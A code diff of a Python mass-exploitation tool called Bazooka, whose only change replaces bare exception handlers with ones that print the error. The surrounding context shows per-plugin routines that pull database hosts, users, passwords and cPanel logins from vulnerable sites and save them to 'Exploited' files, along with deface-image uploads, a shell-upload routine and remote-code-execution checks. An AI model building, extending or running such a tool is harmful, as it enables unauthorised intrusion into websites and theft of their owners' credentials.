                     self.Print_NotVuln('jtrtresponsivetables', site)
             else:
                 self.Print_NotVuln('jtrtresponsivetables', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('jtrtresponsivetables', site)
 
     def acento(self, site):
@@ -3414,11 +3529,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('acento', site)
             else:
                 self.Print_NotVuln('acento', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('acento', site)
 
     def ajaxstore(self, site):
@@ -3439,11 +3556,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('ajaxstore', site)
             else:
                 self.Print_NotVuln('ajaxstore', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('ajaxstore', site)
 
     def Antioch(self, site):
@@ -3464,11 +3583,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('Antioch', site)
             else:
                 self.Print_NotVuln('Antioch', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Antioch', site)
 			
     def Authentic(self, site):
@@ -3489,11 +3610,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('Authentic', site)
             else:
                 self.Print_NotVuln('Authentic', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Authentic', site)			
 
     def Churchope(self, site):
@@ -3514,11 +3637,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('Churchope', site)
             else:
                 self.Print_NotVuln('Churchope', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Churchope', site)		
 
     def Epic(self, site):
@@ -3539,11 +3664,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('Epic', site)
             else:
                 self.Print_NotVuln('Epic', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Epic', site)	
 
     def Felis(self, site):
@@ -3564,11 +3691,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('Felis', site)
             else:
                 self.Print_NotVuln('Felis', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Felis', site)
 
     def Force(self, site):
@@ -3589,11 +3718,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('Force', site)
             else:
                 self.Print_NotVuln('Force', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Force', site)
 			
 			
@@ -3615,11 +3746,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('hbaudio', site)
             else:
                 self.Print_NotVuln('hbaudio', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('hbaudio', site)			
 
     def History(self, site):
@@ -3640,11 +3773,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('History', site)
             else:
                 self.Print_NotVuln('History', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('History', site)	
 
     def Imageex(self, site):
@@ -3665,11 +3800,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('Imageex', site)
             else:
                 self.Print_NotVuln('Imageex', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Imageex', site)	
 
     def kbslider(self, site):
@@ -3690,11 +3827,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('kbslider', site)
             else:
                 self.Print_NotVuln('kbslider', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('kbslider', site)	
 
     def Linenity(self, site):
@@ -3715,11 +3854,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('Linenity', site)
             else:
                 self.Print_NotVuln('Linenity', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Linenity', site)	
 
     def Lote27(self, site):
@@ -3740,11 +3881,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('Lote27', site)
             else:
                 self.Print_NotVuln('Lote27', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Lote27', site)
 
     def Markant(self, site):
@@ -3765,11 +3908,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('Markant', site)
             else:
                 self.Print_NotVuln('Markant', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Markant', site)
 
     def MichaelCanthony(self, site):
@@ -3790,11 +3935,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('MichaelCanthony', site)
             else:
                 self.Print_NotVuln('MichaelCanthony', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('MichaelCanthony', site)
 
 
@@ -3816,11 +3963,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('NativeChurch', site)
             else:
                 self.Print_NotVuln('NativeChurch', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('NativeChurch', site)
 
     def Parallelus(self, site):
@@ -3841,11 +3990,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('Parallelus', site)
             else:
                 self.Print_NotVuln('Parallelus', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Parallelus', site)
 
     def RedSteel(self, site):
@@ -3866,11 +4017,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('RedSteel', site)
             else:
                 self.Print_NotVuln('RedSteel', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('RedSteel', site)
 
     def S3bubble(self, site):
@@ -3891,11 +4044,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('S3bubble', site)
             else:
                 self.Print_NotVuln('S3bubble', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('S3bubble', site)
 
     def SMWF(self, site):
@@ -3916,11 +4071,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('SMWF', site)
             else:
                 self.Print_NotVuln('SMWF', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('SMWF', site)
 
     def TheLoft(self, site):
@@ -3941,11 +4098,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('TheLoft', site)
             else:
                 self.Print_NotVuln('TheLoft', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('TheLoft', site)
 
     def cpanel(self, site):
@@ -3961,11 +4120,13 @@ class Bazooka(object):
                     with open('Exploited/Cpanel.txt', 'a') as ww:
                         ww.write('Cpanel Path  : ' + site + '  user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('cpanel', site)
             else:
                 self.Print_NotVuln('cpanel', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('cpanel', site)
 
     def Com_extplorer(self, site):
@@ -4015,7 +4176,8 @@ class Bazooka(object):
                         writer.write(site + '/tmp/plupload/' + self.Jce_Deface_image.split('/')[1] + '\n')
                 else:
                     self.Print_NotVuln('Com_jwallpapers', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Com_jwallpapers', site)
 
     def Com_jwallpapers_Shell(self, site):
@@ -4069,7 +4231,8 @@ class Bazooka(object):
                         self.Com_jwallpapers_index(site)
                 else:
                     self.Com_jwallpapers_index(site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Com_jwallpapers_index(site)
 
 
@@ -4130,7 +4293,8 @@ class Bazooka(object):
                     self.Print_NotVuln('barclaycart plugin', site)
             else:
                 self.Print_NotVuln('barclaycart plugin', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('barclaycart plugin', site)
 
     def Com_s5_media_playerx(self, site):
@@ -4142,7 +4306,8 @@ class Bazooka(object):
                 self.printor('Com_s5_media_player',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def Com_Hdflvplayerx(self, site):
         try:
@@ -4153,7 +4318,8 @@ class Bazooka(object):
                 self.printor('Com_Hdflvplayer',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def Drupal_Bartik(self, site):
         try:
@@ -4163,7 +4329,8 @@ class Bazooka(object):
                 self.printor('Drupal_Bartik',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def kcfind(self, site):
         try:
@@ -4175,7 +4342,8 @@ class Bazooka(object):
                 self.printor('kcfind',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def Vbulletin_RCE5(self, site):
         try:
@@ -4185,7 +4353,8 @@ class Bazooka(object):
                 self.printor('Vbulletin_RCE5',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def vehiculo_photos(self, site):
         try:
@@ -4196,7 +4365,8 @@ class Bazooka(object):
                 self.printor('vehiculo_photos',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def FilesUpp(self, site):
         try:
@@ -4206,7 +4376,8 @@ class Bazooka(object):
                 self.printor('FilesUpp',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def tinymce(self, site):
         try:
@@ -4217,7 +4388,8 @@ class Bazooka(object):
                 self.printor('tinymce',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def Ajaxfilemanager1(self, site):
         try:
@@ -4228,7 +4400,8 @@ class Bazooka(object):
                 self.printor('Ajaxfilemanager',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def Arrayfil(self, site):
         try:
@@ -4238,7 +4411,8 @@ class Bazooka(object):
                 self.printor('Arrayfil',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def jquery(self, site):
         try:
@@ -4248,7 +4422,8 @@ class Bazooka(object):
                 self.printor('jquery',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def PhotoStore(self, site):
         try:
@@ -4259,7 +4434,8 @@ class Bazooka(object):
                 self.printor('PhotoStore',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def cfg_contactform(self, site):
         try:
@@ -4269,7 +4445,8 @@ class Bazooka(object):
                 self.printor('cfg_contactform',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def PHP_Fusion(self, site):
         try:
@@ -4279,7 +4456,8 @@ class Bazooka(object):
                 self.printor('PHP_Fusion',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def uploadifyamazons3(self, site):
         try:
@@ -4289,7 +4467,8 @@ class Bazooka(object):
                 self.printor('uploadify-amazon-s3',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def umapresence(self, site):
         try:
@@ -4299,7 +4478,8 @@ class Bazooka(object):
                 self.printor('umapresence',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def TikiWiki(self, site):
         try:
@@ -4309,7 +4489,8 @@ class Bazooka(object):
                 self.printor('TikiWiki',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def Wordpressinstaller(self, site):
         try:
@@ -4319,7 +4500,8 @@ class Bazooka(object):
                 self.printor('Wordpressinstaller',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def betheme(self, site):
         try:
@@ -4329,7 +4511,8 @@ class Bazooka(object):
                 self.printor('betheme',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def woopraRCE(self, site):
         try:
@@ -4339,7 +4522,8 @@ class Bazooka(object):
                 self.printor('woopraRCE',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def invit0r(self, site):
         try:
@@ -4349,7 +4533,8 @@ class Bazooka(object):
                 self.printor('invit0r',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def formidable(self, site):
         try:
@@ -4359,7 +4544,8 @@ class Bazooka(object):
                 self.printor('formidable',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def evarisk(self, site):
         try:
@@ -4369,7 +4555,8 @@ class Bazooka(object):
                 self.printor('evarisk',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def wpslimstatRCE(self, site):
         try:
@@ -4379,7 +4566,8 @@ class Bazooka(object):
                 self.printor('wpslimstatRCE',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def completeGalleryManager(self, site):
         try:
@@ -4389,7 +4577,8 @@ class Bazooka(object):
                 self.printor('completeGalleryManager',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def ShoppingCart(self, site):
         try:
@@ -4399,7 +4588,8 @@ class Bazooka(object):
                 self.printor('ShoppingCart',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def auctionPlugin(self, site):
         try:
@@ -4409,7 +4599,8 @@ class Bazooka(object):
                 self.printor('auctionPlugin',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def area53(self, site):
         try:
@@ -4419,7 +4610,8 @@ class Bazooka(object):
                 self.printor('area53',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def utstrange(self, site):
         try:
@@ -4429,7 +4621,8 @@ class Bazooka(object):
                 self.printor('utstrange',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def ThisWay(self, site):
         try:
@@ -4439,7 +4632,8 @@ class Bazooka(object):
                 self.printor('ThisWay',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def theagency(self, site):
         try:
@@ -4449,7 +4643,8 @@ class Bazooka(object):
                 self.printor('theagency',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def switchblade(self, site):
         try:
@@ -4459,7 +4654,8 @@ class Bazooka(object):
                 self.printor('switchblade',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def atom(self, site):
         try:
@@ -4469,7 +4665,8 @@ class Bazooka(object):
                 self.printor('atom',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def purevision(self, site):
         try:
@@ -4479,7 +4676,8 @@ class Bazooka(object):
                 self.printor('purevision',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def magnitudo(self, site):
         try:
@@ -4489,7 +4687,8 @@ class Bazooka(object):
                 self.printor('magnitudo',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def cubed_v1dot2(self, site):
         try:
@@ -4499,7 +4698,8 @@ class Bazooka(object):
                 self.printor('cubed_v1dot2',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def RightNow(self, site):
         try:
@@ -4509,7 +4709,8 @@ class Bazooka(object):
                 self.printor('RightNow',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def Tevolution(self, site):
         try:
@@ -4519,7 +4720,8 @@ class Bazooka(object):
                 self.printor('Tevolution',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def html5avmanager(self, site):
         try:
@@ -4529,7 +4731,8 @@ class Bazooka(object):
                 self.printor('html5avmanager',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def dzsvideowhisper(self, site):
         try:
@@ -4539,7 +4742,8 @@ class Bazooka(object):
                 self.printor('dzsvideowhisper',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def galleryversion(self, site):
         try:
@@ -4549,7 +4753,8 @@ class Bazooka(object):
                 self.printor('galleryversion',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def konzept(self, site):
         try:
@@ -4559,7 +4764,8 @@ class Bazooka(object):
                 self.printor('konzept',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def Seowatcher(self, site):
         try:
@@ -4569,7 +4775,8 @@ class Bazooka(object):
                 self.printor('Seowatcher',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def omnisecurefil(self, site):
         try:
@@ -4579,7 +4786,8 @@ class Bazooka(object):
                 self.printor('omnisecurefil',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def pitchprint(self, site):
         try:
@@ -4589,7 +4797,8 @@ class Bazooka(object):
                 self.printor('pitchprint',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def satoshi(self, site):
         try:
@@ -4599,7 +4808,8 @@ class Bazooka(object):
                 self.printor('satoshi',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def radialth(self, site):
         try:
@@ -4609,7 +4819,8 @@ class Bazooka(object):
                 self.printor('radialth',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def pinboard(self, site):
         try:
@@ -4619,7 +4830,8 @@ class Bazooka(object):
                 self.printor('pinboard',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass   
     def wpstorecart(self, site):
         try:
@@ -4629,7 +4841,8 @@ class Bazooka(object):
                 self.printor('wpstorecart',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def armyknife(self, site):
         try:
@@ -4639,7 +4852,8 @@ class Bazooka(object):
                 self.printor('armyknife',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def assetmanager(self, site):
         try:
@@ -4649,7 +4863,8 @@ class Bazooka(object):
                 self.printor('assetmanager',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def evolve(self, site):
         try:
@@ -4659,7 +4874,8 @@ class Bazooka(object):
                 self.printor('evolve',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def acffrontenddisplay(self, site):
         try:
@@ -4669,7 +4885,8 @@ class Bazooka(object):
                 self.printor('acffrontenddisplay',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def designfolioplus(self, site):
         try:
@@ -4679,7 +4896,8 @@ class Bazooka(object):
                 self.printor('designfolioplus',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def Learndash(self, site):
         try:
@@ -4689,7 +4907,8 @@ class Bazooka(object):
                 self.printor('Learndash',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def MarketPlace(self, site):
         try:
@@ -4699,7 +4918,8 @@ class Bazooka(object):
                 self.printor('MarketPlace',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def uploaderplug(self, site):
         try:
@@ -4709,7 +4929,8 @@ class Bazooka(object):
                 self.printor('uploaderplug',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def wpproperty(self, site):
         try:
@@ -4719,7 +4940,8 @@ class Bazooka(object):
                 self.printor('wpproperty',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def socialnetwork(self, site):
         try:
@@ -4729,7 +4951,8 @@ class Bazooka(object):
                 self.printor('socialnetwork',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def magicfields(self, site):
         try:
@@ -4739,7 +4962,8 @@ class Bazooka(object):
                 self.printor('magicfields',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def custombackground(self, site):
         try:
@@ -4749,7 +4973,8 @@ class Bazooka(object):
                 self.printor('custombackground',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def ecstatic(self, site):
         try:
@@ -4759,7 +4984,8 @@ class Bazooka(object):
                 self.printor('ecstatic',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def customtshirtdesigner(self, site):
         try:
@@ -4769,7 +4995,8 @@ class Bazooka(object):
                 self.printor('customtshirtdesigner',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def qualifire(self, site):
         try:
@@ -4779,7 +5006,8 @@ class Bazooka(object):
                 self.printor('qualifire',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def boxit(self, site):
         try:
@@ -4789,7 +5017,8 @@ class Bazooka(object):
                 self.printor('boxit',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def Ghostth(self, site):
         try:
@@ -4799,7 +5028,8 @@ class Bazooka(object):
                 self.printor('Ghostth',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def Coldfusion(self, site):
         try:
@@ -4809,7 +5039,8 @@ class Bazooka(object):
                 self.printor('Coldfusion',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def simplecart(self, site):
         try:
@@ -4819,7 +5050,8 @@ class Bazooka(object):
                 self.printor('simplecart',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def ninetofive(self, site):
         try:
@@ -4829,7 +5061,8 @@ class Bazooka(object):
                 self.printor('ninetofive',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def JsorSliders(self, site):
         try:
@@ -4839,7 +5072,8 @@ class Bazooka(object):
                 self.printor('JsorSliders',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def clockstone(self, site):
         try:
@@ -4849,7 +5083,8 @@ class Bazooka(object):
                 self.printor('clockstone',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def Blaze(self, site):
         try:
@@ -4859,7 +5094,8 @@ class Bazooka(object):
                 self.printor('Blaze',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def Catpro(self, site):
         try:
@@ -4869,7 +5105,8 @@ class Bazooka(object):
                 self.printor('Catpro',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def downloadsmanagr(self, site):
         try:
@@ -4879,7 +5116,8 @@ class Bazooka(object):
                 self.printor('downloadsmanagr',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def formcraft(self, site):
         try:
@@ -4890,7 +5128,8 @@ class Bazooka(object):
                 self.printor('formcraft',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def openflashchart(self, site):
         try:
@@ -4900,7 +5139,8 @@ class Bazooka(object):
                 self.printor('openflashchart',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def dreamwork(self, site):
         try:
@@ -4910,7 +5150,8 @@ class Bazooka(object):
                 self.printor('dreamwork',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def contactform(self, site):
         try:
@@ -4920,7 +5161,8 @@ class Bazooka(object):
                 self.printor('contactform',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def fluid_forms(self, site):
         try:
@@ -4930,7 +5172,8 @@ class Bazooka(object):
                 self.printor('fluid_forms',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def levoslideshow(self, site):
         try:
@@ -4940,7 +5183,8 @@ class Bazooka(object):
                 self.printor('levoslideshow',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def vertical(self, site):
         try:
@@ -4950,7 +5194,8 @@ class Bazooka(object):
                 self.printor('vertical',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def carousel(self, site):
         try:
@@ -4960,7 +5205,8 @@ class Bazooka(object):
                 self.printor('carousel',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def superb(self, site):
         try:
@@ -4970,7 +5216,8 @@ class Bazooka(object):
                 self.printor('superb',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass   
     def yass(self, site):
         try:
@@ -4980,7 +5227,8 @@ class Bazooka(object):
                 self.printor('yass',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def homepageslideshow(self, site):
         try:
@@ -4990,7 +5238,8 @@ class Bazooka(object):
